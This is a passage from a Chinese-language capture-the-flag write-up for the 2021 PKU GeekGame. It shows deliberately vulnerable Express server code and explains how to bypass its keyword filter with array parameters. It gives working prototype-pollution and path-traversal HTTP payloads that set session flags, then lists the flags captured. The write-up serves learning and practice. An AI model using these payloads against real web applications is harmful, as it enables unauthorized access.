        <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>bad_name<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/:path(*)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> path <span class="token operator">=</span> <span class="token string">'data/'</span><span class="token operator">+</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>path<span class="token punctuation">;</span>
    <span class="token keyword">let</span> in_path <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>in_path<span class="token operator">||</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> out_path <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>out_path<span class="token operator">||</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> prefix <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>prefix <span class="token operator">?</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> eval_mode <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>eval_enabled<span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span>in_path<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">waf</span><span class="token punctuation">(</span>out_path<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">waf</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad parameter!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File does not exists!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length<span class="token operator">&gt;</span><span class="token constant">MAX_LENGTH</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File too big!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Cannot parse file as JSON!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    in_path <span class="token operator">=</span> prefix <span class="token operator">+</span> in_path<span class="token punctuation">;</span>
    in_path <span class="token operator">=</span> in_path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=&gt;</span>x<span class="token operator">!==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> term <span class="token keyword">of</span> in_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad parameter!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>eval_mode <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\([^a-zA-Z"',;]+\)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span>
            term <span class="token operator">=</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span>
            data<span class="token punctuation">[</span>term<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        data <span class="token operator">=</span> data<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad data!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    out_path <span class="token operator">=</span> prefix <span class="token operator">+</span> out_path<span class="token punctuation">;</span>
    out_path <span class="token operator">=</span> out_path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=&gt;</span>x<span class="token operator">!==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>out_path<span class="token punctuation">.</span>length<span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span>
        output <span class="token operator">=</span> data<span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> cur <span class="token operator">=</span> output<span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> term <span class="token keyword">of</span> out_path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> out_path<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad parameter!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// no eval for out_path :)</span>
            <span class="token comment">/*
            if(eval_mode &amp;&amp; /^\([^a-zA-Z"',;]+\)$/.test(term))
                term = safe_eval(term);
            */</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span>
                cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            cur <span class="token operator">=</span> cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cur<span class="token punctuation">[</span>out_path<span class="token punctuation">[</span>out_path<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/activate'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>code<span class="token operator">===</span><span class="token constant">FLAG1</span><span class="token punctuation">)</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated<span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">You have been activated. Activation code: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">FLAG1</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Wrong activation code :('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/eval_settings'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated<span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Eval feature requires activation :('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>eval_enabled <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token operator">===</span><span class="token string">'on'</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Eval set to </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>eval_enabled<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/prefix_settings'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated<span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Prefix feature requires activation :('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad prefix!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>prefix <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>prefix<span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Prefix set to "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>prefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">start_server</span><span class="token punctuation">(</span><span class="token parameter">port</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">FLAG0</span><span class="token operator">!==</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">flag{</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token number">0.1</span><span class="token operator">+</span><span class="token number">0.2</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">}</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token constant">FLAG2</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server started on :</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag0</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113153516935.png"></p>
<p><code>flag{0.30000000000000004}</code></p>
<h3 id="壹·开通会员"><a href="#壹·开通会员" class="headerlink" title="壹·开通会员"></a>壹·开通会员</h3><p>再看 flag1 相关的源码。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/activate'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>code<span class="token operator">===</span><span class="token constant">FLAG1</span><span class="token punctuation">)</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>activated<span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">You have been activated. Activation code: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">FLAG1</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Wrong activation code :('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显是要 <strong>原型链污染</strong> 了。</p>
<p>这里需要 <code>req.session.activated</code> 不为假就行，而这个参数本身是没定义过的，于是就会往上一层去找，所以可以直接污染 Object，让 <code>Object.activated</code> 有值就行。</p>
<p>再看源码。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">in_path <span class="token operator">=</span> prefix <span class="token operator">+</span> in_path<span class="token punctuation">;</span>
in_path <span class="token operator">=</span> in_path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=&gt;</span>x<span class="token operator">!==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> term <span class="token keyword">of</span> in_path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad parameter!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>eval_mode <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\([^a-zA-Z"',;]+\)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span>
        term <span class="token operator">=</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span>
        data<span class="token punctuation">[</span>term<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    data <span class="token operator">=</span> data<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad data!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
out_path <span class="token operator">=</span> prefix <span class="token operator">+</span> out_path<span class="token punctuation">;</span>
out_path <span class="token operator">=</span> out_path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=&gt;</span>x<span class="token operator">!==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>out_path<span class="token punctuation">.</span>length<span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> data<span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> cur <span class="token operator">=</span> output<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> term <span class="token keyword">of</span> out_path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> out_path<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Bad parameter!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// no eval for out_path :)</span>
        <span class="token comment">/*
            if(eval_mode &amp;&amp; /^\([^a-zA-Z"',;]+\)$/.test(term))
                term = safe_eval(term);
            */</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span>
            cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        cur <span class="token operator">=</span> cur<span class="token punctuation">[</span>term<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    cur<span class="token punctuation">[</span>out_path<span class="token punctuation">[</span>out_path<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里过滤了不能有 <code>_</code>，且在 waf 里也遍历了输入的 <code>str.indexOf</code> 是否存在和 <code>({}).__proto__</code> 所包含的属性。看起来很好地过滤了原型链，实际上并不是。</p>
<p><em>（然而喵喵却调了老半天……</em></p>
<p>这个 <code>indexOf</code>，其实不仅仅 Sting 有，Array 也有，只要咱传个数组进去，就匹配不到这些属性名称了。</p>
<p>这个 trick 还是今年东华杯的一道 web 中的见到的，赛后看其他师傅 wp 学到的（</p>
<p>然而，还不能用 <code>__proto__</code>，但其实能用 <code>constructor.prototype</code>.</p>
<p>再回到源码，为了完成这个赋值，<code>out_path</code> 通过 <code>cur = cur[term];</code> 依次往 <code>{}</code> 内层嵌套赋值，再把最后的结果从读取到的 JSON 文件里取 <code>in_path</code> 相应的值。于是就可以通过 <code>/</code> 来分割每一个 <code>.</code>，也就是构造 <code>constructor/prototype/xxx</code> 这样就行了。</p>
<p>这里只需要 activated 不为假，那随便整个 <code>demo.js</code> 里的东西赋值过去就完事了。</p>
<p>唉，本地调了老半天……可以看到这个 <code>req.session.activated</code> 就被设置了。还是太菜了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113195542262.png"></p>
<p>然后打远程。</p>
<p>payload:</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /api/demo.json?in_path=1&amp;out_path[]=constructor/prototype/activated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>再访问 <code>/activate</code></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113194509374.png"></p>
<p><code>flag{I-Can-activate-FRom-Prototype}</code></p>
<p>抢了个二血（可恶，一血没了，呜呜</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113194958963.png"></p>
<h3 id="贰·为所欲为"><a href="#贰·为所欲为" class="headerlink" title="贰·为所欲为"></a>贰·为所欲为</h3><p>那接下来就是要让 <code>req.session.eval_enabled===1</code>。</p>
<p>在想去哪找个1呢？前面那个 <code>package.json</code> 里正好有，来试试行不行。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113195412137.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113195457081.png"></p>
<p>尝试构造 payload:</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /api/../package.json?in_path=version/0&amp;out_path[]=constructor/prototype/eval_enabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113200106759.png"></p>
<p>然而发现不大行，他是 <code>===</code>，这个 string 绕不过……得找个 int 的 1.</p>
<p>试了试，发现 <code>Object.length === 1</code>.</p>
<p>于是可以用 <code>{}["constructor"]["length"]</code> 来得到1.</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113203214114.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /api/demo.json?in_path[]=0/constructor/length<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
